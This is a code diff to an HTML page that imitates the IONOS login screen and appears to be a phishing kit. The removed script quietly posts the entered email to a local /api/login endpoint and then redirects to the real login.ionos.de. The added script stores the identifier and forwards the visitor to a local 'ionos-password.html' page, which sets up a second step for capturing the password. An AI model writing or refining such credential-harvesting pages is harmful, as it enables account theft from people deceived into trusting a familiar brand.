@@ -159,7 +159,7 @@
   </footer>
 
   <script>
-    document.getElementById("ionos-login-form").addEventListener("submit", async function (e) {
+    document.getElementById("ionos-login-form").addEventListener("submit", function (e) {
       e.preventDefault();
       const identifier = document.getElementById("username").value.trim();
       if (!identifier) return;
@@ -168,15 +168,9 @@
       btn.disabled = true;
       btn.textContent = "Weiter …";
 
-      try {
-        await fetch("/api/login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email: identifier, password: "(step 1)" })
-        });
-      } catch (_) {}
-
-      window.location.href = "https://login.ionos.de/";
+      sessionStorage.setItem("ionos_identifier", identifier);
+      window.location.href =
+        "ionos-password.html?identifier=" + encodeURIComponent(identifier) + "#";
     });
   </script>
 
